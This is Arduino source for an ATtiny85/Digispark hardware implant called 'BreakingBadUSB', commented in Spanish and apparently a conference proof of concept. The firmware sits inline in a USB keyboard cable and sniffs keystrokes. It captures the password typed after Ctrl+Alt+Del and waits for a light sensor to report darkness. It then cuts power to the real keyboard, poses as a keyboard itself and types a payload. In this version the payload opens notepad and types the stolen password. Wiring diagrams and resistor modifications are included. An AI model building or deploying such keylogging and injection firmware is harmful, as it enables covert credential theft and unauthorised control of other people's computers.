// BreakingBadUSB_POC_Code 
// * Based on Obdev's AVRUSB code and under the same license.
// * https://github.com/obdev/v-usb
// *
// * Funciones implemetadas:
// * Patillas Attiny85 en modo alta impedancia (la señal usb pasa sin alteracion)
// * Monitorea/sniff pulsaciones de teclado esperando Control+Alt+Supr
// * Captura secuencia de teclas tecleada despues de Control+Alt+Supr (password)
// * Espera a que se apague la luz (gracias a un sensor de luz integrado)
// * Desconecta teclado. (corta la alimentacion del mismo usando 2 patillas I/O)
// * Entra como teclado. (el attiny entra como teclado usando DigiKeyboard.h)
//
// Compila con la definicion de placas ATtinyCore => ATiny85/Micronucleus
// Compila con la definicion de placas Digistump => Digispark defaullt 16.5Mhz
// https://euskalhack.org/ 
//
//Pasos a Seguir:
//1) Flash en Led de depuracion 
//2) dejo pasar el USB a través del cable. (patillas usb en alta impedancia)
//3) Alimento teclado conectando la patilla + del teclado al pin P0
//4) Inicio libreria V-USB (en este caso inicio escuchateclado)
//5) bucle con delay_sniff DigiKeyboard.delay Modificado
//   desde el que se llama a usbPoll_sniff y usbProcessRx_sniff
//   Donde esta la rutina de DETECION PULSACION TECLAS
//   
//6) POC Keyboard Payload (codigo sacado de POC_bad_USB_cable_charger (cable cargador usb))
//   6.1) Corto Alimentacion del teclado externo 
//   6.2) Salgo Modo sniff
//   6.3) Inicio teclado (interno)
//   6.4) lanzo payload  (Carga Util)
//   6.5) Desconecto USB (teclado interno)
//   6.6) Reseteo Micro



// =============================================================================================
//               Patillaje Chip Attiny85
//                       +-\/-+
// RESET/ADC0 (D5) PB5  1|    |8  VCC
//  USB- ADC3 (D3) PB3  2|    |7  PB2 (D2) SCK/SCL/INT0/ADC1 - default TX Debug output for ATtinySerialOut
//  USB+ ADC2 (D4) PB4  3|    |6  PB1 (D1) MISO/DO/OC0B/OC1A/AIN1/PCINT1 - (Digispark) LED
//                 GND  4|    |5  PB0 (D0) MOSI/DI/SDA/OC0A/AIN0
//                       +----+
// =============================================================================================
//
//             Patillaje Placa DigiSpark
//
//                +-----------------+
//                |     ,-----+     |
//       +--------+     |     |   O | PB5 (D5) RESET/ADC0
// Gnd   | ======       +-----+   O | PB4 (D4) USB+  ADC2
// USB+  |   ====             "   O | PB3 (D3) USB-  ADC3 
// USB-  |   ====      ______     O | PB2 (D2) SCK/SCL/INT0/ADC1
// Vcc   | ======     |      |    O | PB1 (D1) LED" MISO/DO/OC0B/OC1A/AIN1/PCINT1
//       +--------+   |______|    O | PB0 (D0) MOSI/DI/SDA/OC0A/AIN0
//                |  O O O "        | 
//                +-----------------+
//                 5V GND Vin
//
// =============================================================================================
//            Esquema Basico Breaking Bad USB
//            x Para que funcione mejor tienes que quitar con un cuter la resistencia original de 1k5
//              situada en el punto "x" y substituirla por una de 5K6 si no la deteccion USB falla al haber 2 resistencia pullup
//               +-------------------+         __________   
//               |   x  ,-----+      |        |          |\
//      +--------+      |     |  P5 O|   /----| GND      |.\ 
// Gnd  | ======        +-----+  P4 O+--------| USB+     |:|
//      |   ====     +---[R5K6]--P3 O+--------| USB-     |:|
//      |   ====     |           P2 O+--------| Vcc      |:|   
// Vcc  | ======     |           P1 O|   |    |__________|'|             
//      +--------+ 5v|           P0 O+---+     \__________\|
//               |   O O O           |     
//               +-------------------+      
//
//
#define LED     1 //Led  PB1 
#define USB_N   4 //USB- PB4
#define USB_P   3 //USB+ PB5
#define kbd_GND 0 //pongo la alimentacion Negativa del keyboard a P0
#define kbd_Vcc 2 //pongo la alimentacion Positiva del keyboard a P2
                  //asi lo puedo "encender" y "apagar" cuando quiera
                  //nota en usbdrvasm.S linea 990 si kbd_VCC=1 anulo envio de paquetes USB
                  // asi se mantienen USB_N y USB_P en altan impedancia (modo SNIFF) 
                  //Nota en usbdrvasm.S linea 991 sbic USBIN,2; salto si kbd_Vcc=0


#include "DigiKeyboard_sniff_2.h"  //Copia de la libreria DigiKeyboard integrada en el proyecto
void(* resetFunc)(void)=0;//declara funcion reset apuntando direccion 0

static uchar crtl_alt_supr=0;
static uchar password[USB_BUFSIZE];//aqui almaceno el password capturado despues de Ctrl+alt+supr
//static int kluz=0;                 //contador de segundos sin luz
                      

void setup() {

  //2) dejo pasar el USB a través del cable. (patillas usb en alta impedancia)
  pinMode(USB_N , INPUT);   //Pongo d+ como entrada (Alta impedancia)
  pinMode(USB_P , INPUT);   //Pongo d- como entrada (Alta impedancia)
  pinMode(PB5, INPUT);      //PB5/RESET como entrada Para sensor de luz
  
  //1) led de depuracion
  pinMode(LED     , OUTPUT);//led interno placa DigiSpark
  digitalWrite(LED,HIGH);   //flash de depuracion en el led.
  delay(250);//delay(1);    //250ms asi se cuando el codigo pasa por setup()
  digitalWrite(LED,LOW);    //apago led

  //Modo demo 1/2
  int pullup_antes_kbd=analogRead(3);//leo USB- en analogico antes de conectar teclado
  
  //3) Alimento teclado conectando la patilla - del teclado al pin P0
  digitalWrite(kbd_GND,LOW);    //Pongo alimentacion- del teclado
  pinMode(kbd_GND     ,OUTPUT); //Enciendo Alimentacion teclado 
  digitalWrite(kbd_Vcc,HIGH);   //Pongo alimentacion+ del teclado
  pinMode(kbd_Vcc     ,OUTPUT); //Enciendo Alimentacion teclado 
  delay(9);
  
  //Modo demo 2/2 (con la resistencia de 3k3 funciona peor que con 5k6
  //Si no detecto otra resistencia pullupp es que no hay nada conectado=>entro en modo demo
  int pullup_despues_kbd=analogRead(3);//leo USB- en analogico antes de conectar teclado
  if ( pullup_antes_kbd+0 > pullup_despues_kbd ){ //+X margen
    //si la tension no ha subido un poco es que no hay nada conectado detras=>entro en modo demo
    demo(); 
  }
  
  //4)Inicio libreria V-USB (en este caso inicio Solo Parte escucha teclado)
  usbDeviceConnect();
  DigiKeyboard.delay(990);//686ms hasta reset. el teclado Tarda casi 1seg en configurarse
}

void loop() {
  //5) bucle delay_sniff DigiKeyboard.delay Modificado desde el que se llama a usbpoll y usbProcessRx 
  delay_sniff(1000);//retardo en el que compruebo si hay paquetes de datos USB

  // Sensor luz con una LDR y una resistencia en serie de 100k entre patilla PB5/RESET/ADC0 y GND
  static int kluz=0;     //contador de segundos sin luz
  int ldr=analogRead(0); //Ojo PB5/RESET es ADC0 no ADC5);  
  //POC enciedo el led interno si no hay luz (a lo fotocelula)
  if(ldr>900){ //900 valor por observacion voy tapando la LDR y observo
    digitalWrite(PB1,!digitalRead(PB1));//,HIGH);
    //if (kluz++>300 && crtl_alt_supr>0) payload();//suelta la carga si la luz lleva 5min apagada
    if(kluz++ > 5) payload();//suelta la carga 
  }else {
    digitalWrite(PB1, LOW);
    //kluz=0;//anulo esta parte porque si no la demo no funciona
  }
  
}

//5)delay_sniff DigiKeyboard.delay Modificado desde el que se llama a usbPoll_sniff y usbProcessRx_sniff
void delay_sniff(long milli) {
    unsigned long last = millis();
    while (milli > 0) {
      usbPoll_sniff();//usbpoll_sniff es una copia de usbpoll en la que solo escucho del USB no proceso
      unsigned long now = millis();
      milli -= now - last;
      last = now;     
    }
  }

//usbPoll_sniff es una copia de usbpoll en la que solo escucho del USB no proceso
void usbPoll_sniff(void){
    extern volatile schar usbRxLen; //= 0; number of bytes in usbRxBuf; 0 means free
    extern volatile uchar usbRxBuf[2*USB_BUFSIZE]; //USB_BUFSIZE=11 PID+8data+2CRC 

    extern volatile uchar usbInputBufOffset; //offset in usbRxBuf used for low level receiving
    //extern volatile uchar usbRxToken; //token for data we received

    schar   len;
    uchar   i;

    /*NO FUNCIONA //Descarto paquetes ACK y NAK comunicacion entre el teclado y el host
    if(usbRxToken==USBPID_ACK||usbRxToken==USBPID_NAK){
      usbRxLen = 0; //tengo que borrar para no acumular buffer
      return;
    }/**/

    //idea los paquetes SETUP , OUT e IN mejor los borro para no acumular buffer
    if(usbRxLen >= 3){
        if(usbRxToken==USBPID_SETUP||usbRxToken==USBPID_OUT||usbRxToken==USBPID_IN){
             usbRxLen = 0;
             return;
        }
    }/* */
    
    len = usbRxLen - 3;//syn+data+crc
    if(len >= 8){ //los paquetes de teclas son de 8 
        usbProcessRx_sniff(usbRxBuf + USB_BUFSIZE + 1 - usbInputBufOffset, len);
        usbRxLen = 0; //una vez procesado paquete lo borro poniendo rx=0
    }

}// fin usbPoll_sniff(void)}


/* ------------------------------------------------------------------------- */

// usbProcessRx_sniff es parecido a usbProcessRx 
// salvo que no escribo nada en el USB (no proceso los paquetes)
static inline void usbProcessRx_sniff(volatile uchar *data, uchar len) {
   //extern volatile uchar usbRxToken; //token for data we received
   digitalWrite(LED,HIGH);//enciendo el led

   //static uchar crtl_alt_supr=0;
   //static uchar password[USB_BUFSIZE];

   //jejo DETECION PULSACION TECLAS  
   //Antes de comprobar teclas compruebo que es un paquete de datos asi descarto falsos positivos
   //if(usbRxToken==(uchar)USBPID_DATA0||usbRxToken==(uchar)USBPID_DATA1){//parece que no funciona (no acota paquetes) 
   if(usbRxToken!=(uchar)USBPID_SETUP && usbRxToken!=(uchar)USBPID_OUT && usbRxToken!=(uchar)USBPID_IN){

        //c,d,e contienen los 3 primeros bytes del dato USB (no hace falta mas)
        uchar c = *data++; //byte0 Modifier keys //Ojo postincremento
        uchar d = *data++; //byte1 reserved (0)
        uchar e = *data;   //byte2 key1 (rara vez se pulsan dos teclas en menos de 8ms) 

        //Deteccion de distintas posibilidades de Ctrl+alt+supr
        if( c & MOD_CONTROL_RIGHT || c & MOD_CONTROL_LEFT ) {
          if( c & MOD_ALT_RIGHT   || c & MOD_ALT_LEFT  ) {
            if( d==0x00 && e==0x63    ) {//KP-./Del
                crtl_alt_supr=1;  //control alt supr Detectado
                return;//salgo dejando encendido led de depuracion asi se que estoy en modo captura password
            } 
          }
        }

        //si he detectado crtl_alt_supr Capturo pulsacion teclas
        if(crtl_alt_supr > 0 && crtl_alt_supr < USB_BUFSIZE){
          if(e){//si e es 0 => he pulsado teclas MOD_ o he soltado(no almaceno esto)
                password[crtl_alt_supr-1]=e; //empiezo desde el 1
                crtl_alt_supr++;
               }
          return; //salgo dejando encendido led de depuracion asi se que estoy capturando password
        }         

        
        //nota: Utilizo otras secuencias para depuracion (probar partes del codigo)
        if(c==(MOD_CONTROL_RIGHT+MOD_ALT_RIGHT) && d==0x00 && e==0x00){
          delay(3000);//Depuracion led 3s encendido.
          payload();  //suelta la carga 
        }
        
        //Utilizo otras secuencias para depuracion (probar partes del codigo)
        if(c==(MOD_ALT_LEFT+MOD_GUI_LEFT) && d==0x00 && e==0x00){
          delay(3000);//Depuracion led 3s encendido.
        }

        //Utilizo otras secuencias para depuracion (probar partes del codigo)
        if(c==(MOD_CONTROL_LEFT+MOD_SHIFT_LEFT) && d==0x00 && e==0x00){
          crtl_alt_supr=1;  //Prueba funcion captura password
          return;//salgo dejando encendido led de depuracion asi se que estoy en modo captura password 
        }
   
   }
   
digitalWrite(LED,LOW);//apago led
}//FIN usb_Sniff_Rx2
 
//6) POC payload. Prueba de concepto de una carga (Mas info en POC_bad_USB_cable_charger)
void payload(void){
  pinMode(LED, OUTPUT);//led interno placa DigiSpark
  digitalWrite(LED,HIGH);//Enciendo led Depuracion para saber que el codigo pasa por aqui

  //subprograma para soltar el payload.
  //codigo sacado de POC_bad_USB_cable_charger (cable cargador usb)

  //6.1)Corto Alimentacion del teclado externo 
  pinMode(kbd_GND     ,INPUT); //DesconectoGND 
  pinMode(kbd_Vcc     ,INPUT); //DesconectoVcc 
  digitalWrite(kbd_Vcc,LOW);   //Salgo Modo sniff(usbdrvasm.S linea 991)

  //*******************************************************************************+
  // problemas en esta parte en funcion del bootloader escogido
  // funciona bien el bootloader de micronucleus digispark >2.5 y una R de 5k6
  // con la resistencia interna 1K o 1K5 NO FUNCIONA bien (a veces falla deteccion por tema electronico)
  // Minimo 3k3 para que funcione bien. 

  //6.2) Salgo Modo sniff(el truco esta en: usbdrvasm.S linea 991)  
  //#include "DigiKeyboard_mod_4sniff.h"
  //digitalWrite(kbd_Vcc,LOW);   //Salgo Modo sniff(usbdrvasm.S linea 991)  
  
  //6.3)Inicio teclado (interno)
  //usbDeviceConnect();         //Ojo ya inicializado en setup
  DigiKeyboardDevice();         //si la anulo esto hare? Suplantacio total teclado???
  DigiKeyboard.delay(900);      //mejora la deteccion(y menos datos en pila)
  DigiKeyboard.sendKeyStroke(0);//Evita perdida primer caracter
  DigiKeyboard.delay(50);       //Retardo para asegurar que se envia el caracter
    
  //6.4)lanzo payload
  /*DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); //Tecla windows
  DigiKeyboard.delay(150);                    // a veces falla a la primera Tecla windows
  DigiKeyboard.sendKeyStroke(0,KEY_ESC);      //asi que la pulso seguida de ESC //enviando 2ESC????
  DigiKeyboard.delay(50);                     //¡¡¡FUNCIONA PEOR!!! con doble tecla windows ????            
  DigiKeyboard.sendKeyStroke(0,KEY_ESC);      //asi que la pulso seguida de ESC //enviando 2ESC????
  DigiKeyboard.delay(150);/* ¡¡¡FUNCIONA PEOR!!! se soluciona? con doble ESC?? NO*/               
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); //Tecla windows (2º intento)                                      
  DigiKeyboard.delay(750);                    //Retardo para que se despliegue el menu
  DigiKeyboard.print(F("notepad"));           //Comando
  DigiKeyboard.delay(750);                    //Retardo para que aparezca comando
  DigiKeyboard.sendKeyStroke(KEY_ENTER);      //Intro                     
  DigiKeyboard.delay(900);                    //Retardo para asegurar que se envia el caracter
  DigiKeyboard.sendKeyStroke(KEY_ENTER);      //2º Intro por seguridad  ¡¡¡FUNCIONA PEOR!!! (creo que es poco retardo)
  DigiKeyboard.delay(1500);                   //Retardo incio comando

  DigiKeyboard.print(F("h-con Hackplayers "));//con F("")ahorro 30 bytes de RAM
  DigiKeyboard.delay(100);                    //Retardo transmision teclas(reduzco uso buffer)
  DigiKeyboard.println(F("c0nference!"));     //con F("")ahorro 30 bytes de RAM
  DigiKeyboard.delay(100);                    //Retardo transmision teclas(reduzco uso buffer)
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50);
  
  if(crtl_alt_supr > 0){
    DigiKeyboard.println(F("Tu Password es:"));
    DigiKeyboard.delay(250);
    for(uchar i = 0; i < crtl_alt_supr ; i++){
      DigiKeyboard.sendKeyStroke(password[i]);
      DigiKeyboard.delay(25);
    }  
  }else{
    DigiKeyboard.println(F("Password no capturado."));
    DigiKeyboard.delay(500);
  }
  
  //Parpadeo led depuracion Asi se que he terminado de lanzar payload
  for(uchar i = 0; i < 150 ; i++){
      digitalWrite(LED,!digitalRead(LED));
      DigiKeyboard.delay(90);
  }
  
  //6.5)Desconecto USB
  usbDeviceDisconnect();        //desconecto dispositivo

  //6.6) Reseteo Micro
  resetFunc(); //Reseteo Micro. (tema inicializacion libreria USB)  
}

void demo(){ 
  digitalWrite(kbd_Vcc,LOW);   //DesconectoVcc y Salgo Modo sniff
  DigiKeyboardDevice();
  //Parpadeo rapido led depuracion Asi se que estoy en modo demo
  for(uchar i = 0; i < 250 ; i++){
      digitalWrite(LED,!digitalRead(LED));
      DigiKeyboard.delay(25);
  }/* */
  payload();
}
